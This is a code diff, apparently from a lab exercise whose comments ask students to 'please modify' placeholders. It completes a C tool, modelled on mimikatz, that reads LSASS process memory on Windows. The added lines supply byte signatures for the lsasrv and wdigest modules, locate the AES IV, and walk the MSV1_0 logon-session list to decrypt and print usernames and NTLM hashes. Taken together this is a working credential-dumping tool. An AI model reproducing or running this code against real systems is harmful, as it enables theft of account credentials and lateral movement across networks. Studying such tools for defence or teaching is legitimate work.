@@ -153,7 +153,7 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	if (ivSigOffset != 0) {
 		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);
 		wprintf(L"ivOffset = 0x%x\n", ivOffset);
-		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset, g_sekurlsa_IV, sizeof g_sekurlsa_IV);
+		ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset, &g_sekurlsa_IV, sizeof g_sekurlsa_IV);
 		//ReadFromLsass(ivPointer, initializationVector, sizeof(initializationVector));
 		wprintf(L"IV Located (len %d): ", AES_128_KEY_LENGTH);
 		HexdumpBytesPacked(g_sekurlsa_IV, AES_128_KEY_LENGTH);
@@ -171,8 +171,8 @@ VOID GetCredentialsFromWdigest() {
 
 	/// ... 请修改
 	UCHAR pswdSig[] = { //0x48, 0xff ,0x15, 0x4e,0x84, 0x01 ,0x00,
-						0x0f ,0x1f ,0x44 ,0x00 ,0x00,
-						0x48,0x8b,0x35 };
+						0x0f, 0x1f, 0x44, 0x00, 0x00,
+						0x48, 0x8b, 0x35 };
 	logSessListSigOffset = SearchPattern(wdigestBaseAddress, pswdSig, sizeof(pswdSig));
 	if (logSessListSigOffset != 0) {
 		// 从wdigest.dll模块基地址 + 签名偏移 + 签名长度 + 4字节偏移中读取出链表头部地址
@@ -236,7 +236,10 @@ VOID GetCredentialsFromMSV() {
 	PKIWI_MSV1_0_LIST_63 logSessListAddr = NULL;	// List Header
 	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");
 	/// ... 请修改
-	UCHAR logSessListSig[] = {1,2,3,4};
+	WCHAR passDecrypted[1024];
+	UCHAR logSessListSig[] = {  0x8B, 0xC7,
+								0x48, 0xC1, 0xE0, 0x04,
+								0x48 ,0x8D ,0x0D };
 	logSessListSigOffset = SearchPattern(lsasrvBaseAddress, logSessListSig, sizeof(logSessListSig));
 	if (logSessListSigOffset != 0) {
 		ReadFromLsass(lsasrvBaseAddress + logSessListSigOffset + sizeof(logSessListSig), &LogonSessionListOffset, sizeof(LogonSessionListOffset));
@@ -249,13 +252,105 @@ VOID GetCredentialsFromMSV() {
 		return;
 	}
 	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;
-
 	do {
 		KIWI_MSV1_0_LIST_63 listEntry;
 		KIWI_MSV1_0_CREDENTIALS credentials;
-
 		/// ... 请修改
+		ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));
+		ReadFromLsass(listEntry.Credentials, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));
+		UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
+			(PUCHAR)pList + offsetof(KIWI_MSV1_0_LIST_63, UserName)
+			));	
+		wprintf(L"username: %ls\n", username->Buffer);
+		if (credentials.PrimaryCredentials == NULL) {
+			wprintf(L"NTLMHash: [NULL]\n\n");
+		}
+		else {
+			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(
+				(PUCHAR)(credentials.PrimaryCredentials) 
+				+ offsetof(KIWI_MSV1_0_PRIMARY_CREDENTIALS, Credentials)
+				));
+			wprintf(L"NTLMHash: ");
+			if (DecryptCredentials((char*)(password->Buffer), password->MaximumLength,
+				(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
+				wprintf(L"%ls\n\n", passDecrypted);
+			}
+			else {
+				wprintf(L"\n\n");
+			}
+		}
 
+		pList = listEntry.Flink;
 	} while (pList != logSessListAddr);
 }
+/*
+// 打印辅助函数
+void printLsaUnicodeString(const LSA_UNICODE_STRING& str, const char* label) {
+	printf("%s: Length = %u, MaximumLength = %u, Buffer = %ws\n",
+		label, str.Length, str.MaximumLength,
+		str.Buffer ? str.Buffer : L"(null)");
+}
 
+void printLuid(const LUID& luid, const char* label) {
+	printf("%s: LowPart = %lu, HighPart = %ld\n", label, luid.LowPart, luid.HighPart);
+}
+
+void printStruct(const KIWI_MSV1_0_LIST_63& s) {
+	printf("Flink: %p\n", s.Flink);
+	printf("Blink: %p\n", s.Blink);
+	printf("unk0: %p\n", s.unk0);
+	printf("unk1: %lu\n", s.unk1);
+	printf("unk2: %p\n", s.unk2);
+	printf("unk3: %lu\n", s.unk3);
+	printf("unk4: %lu\n", s.unk4);
+	printf("unk5: %lu\n", s.unk5);
+	printf("hSemaphore6: %p\n", s.hSemaphore6);
+	printf("unk7: %p\n", s.unk7);
+	printf("hSemaphore8: %p\n", s.hSemaphore8);
+	printf("unk9: %p\n", s.unk9);
+	printf("unk10: %p\n", s.unk10);
+	printf("unk11: %lu\n", s.unk11);
+	printf("unk12: %lu\n", s.unk12);
+	printf("unk13: %p\n", s.unk13);
+
+	printLuid(s.LocallyUniqueIdentifier, "LocallyUniqueIdentifier");
+	printLuid(s.SecondaryLocallyUniqueIdentifier, "SecondaryLocallyUniqueIdentifier");
+
+	printf("waza: ");
+	for (int i = 0; i < 12; i++) {
+		printf("%02X ", s.waza[i]);
+	}
+	printf("\n");
+
+	printLsaUnicodeString(s.UserName, "UserName");
+	printLsaUnicodeString(s.Domaine, "Domaine");
+
+	printf("unk14: %p\n", s.unk14);
+	printf("unk15: %p\n", s.unk15);
+
+	printLsaUnicodeString(s.Type, "Type");
+
+	printf("pSid: %p\n", s.pSid);
+	printf("LogonType: %lu\n", s.LogonType);
+	printf("unk18: %p\n", s.unk18);
+	printf("Session: %lu\n", s.Session);
+	printf("LogonTime: %lld\n", s.LogonTime.QuadPart);
+
+	printLsaUnicodeString(s.LogonServer, "LogonServer");
+
+	printf("Credentials: %p\n", s.Credentials);
+	printf("unk19: %p\n", s.unk19);
+	printf("unk20: %p\n", s.unk20);
+	printf("unk21: %p\n", s.unk21);
+	printf("unk22: %lu\n", s.unk22);
+	printf("unk23: %lu\n", s.unk23);
+	printf("unk24: %lu\n", s.unk24);
+	printf("unk25: %lu\n", s.unk25);
+	printf("unk26: %lu\n", s.unk26);
+	printf("unk27: %p\n", s.unk27);
+	printf("unk28: %p\n", s.unk28);
+	printf("unk29: %p\n", s.unk29);
+	printf("CredentialManager: %p\n", s.CredentialManager);
+}
+
+*/
